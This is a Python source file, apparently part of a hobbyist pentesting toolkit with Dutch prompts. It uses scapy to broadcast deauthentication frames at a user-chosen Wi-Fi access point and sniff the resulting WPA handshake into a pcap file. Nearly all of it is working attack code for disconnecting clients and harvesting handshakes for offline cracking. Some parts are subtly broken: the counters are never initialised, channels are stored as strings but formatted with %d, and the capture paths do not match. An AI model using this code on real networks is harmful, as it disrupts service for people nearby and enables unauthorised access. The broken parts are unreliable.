import os
import Pentesting.ModuleTools as Module
from threading import Thread
from scapy.all import *
from scapy.layers.dot11 import Dot11
from scapy.sendrecv import sniff
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11Deauth
import Pentesting.Network.Scans.Monitor as Monitor


wifi_file = "Output/Wifi.txt"

ssid_list = []
bssid_list = []
chan_list = []

TO_DS = 0b01
EAPOL = 0x888E
WIFI_ETHERTYPE = 0x0800



#############################
#                           #
# Receive AP data from file #
#                           #
#############################


def GetAP():
    with open(wifi_file, "r") as file:
        next(file)
        for line in file:
            parts = line.strip().split()
            if len(parts) >=2:
                ssid = parts[0]
                ssid_list.append(ssid)
                bssid = parts[1]
                bssid_list.append(bssid)
                chan = parts[3]
                chan_list.append(chan)



#############################
#                           #
#    Receive handshake      #
#                           #
#############################

def checkForWPAHandshake(p):
    global from_frames
    global to_frames
    global ap_filter
    pktdump =  PcapWriter('./Output/handshake.pcap',append=True,sync=True)
    if EAPOL in p and ((str(p.addr2) == ap_filter) or (str(p.addr1) == ap_filter)):
        pktdump.write(p)
        to_ds = p.FCfield & TO_DS != 0 
        if to_ds:
            to_frames += 1
            print("AP -> CLI",to_frames)
        else:
            from_frames += 1
            print("CLI -> AP",from_frames)

        if (to_frames == 2) and (from_frames == 2):
            captured_handshake = True
            return True

        return False

    else:
        return False
    


    # WIFI

    # if WIFI_ETHERTYPE in p and ((str(p.addr2) == ap_filter) or (str(p.addr1) == ap_filter)):
    #     pktdump.write(p)
    #     to_ds = p.FCfield & TO_DS != 0 
    #     if to_ds:
    #         to_frames += 1
    #         print("AP -> CLI",to_frames)
    #     else:
    #         from_frames += 1
    #         print("CLI -> AP",from_frames)

    #     if (to_frames == 2) and (from_frames == 2):
    #         captured_handshake = True
    #         return True

    #     return False

    # else:
    #     return False
    

def init_deauth(num):
    target_mac = "ff:ff:ff:ff:ff:ff" 

    dot11 = Dot11(addr1=target_mac, addr2=bssid_list[num], addr3=bssid_list[num])
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    print("Sending Deauth Frame to " + bssid_list[num]+"...")

    sendp(packet, inter=0.1, count=100, iface="wlan0", verbose=1)

def GetHandShake(num):
    num = num - 1
    # Aanvullen
    os.system("iw dev wlan0 set channel %d" % chan_list[num])
    t = Thread(target=init_deauth,args=(num, ))
    t.start()
    p = sniff(iface="wlan0", stop_filter=checkForWPAHandshake, monitor=True)
    print(f"{Module.TGREEN}Handshake grabbed!{Module.TWHITE}")
    t.join()
    os.system(f"mv ./handshake/handshake.pcap ./handshake/handshake-"+ssid_list[num]+".pcap")
    


def Start():
    reset = True
    Monitor.Start()
    GetAP()
    Module.clean()
    while reset:   
        Module.line()
        print(" ")
        for i in range(len(ssid_list)):
            print(f"[ {Module.TGREEN}{i + 1}{Module.TWHITE} ] " + ssid_list[i], bssid_list[i], chan_list[i])
        keuze = int(input(f"\nMake a choice!\n--> "))
        if keuze <= 0:
            Module.clean()
            print("nee")
        elif keuze > i + 1:
            Module.clean()
            print("nee")
        else:
            print("ja")
            reset = False
            GetHandShake(keuze)
    

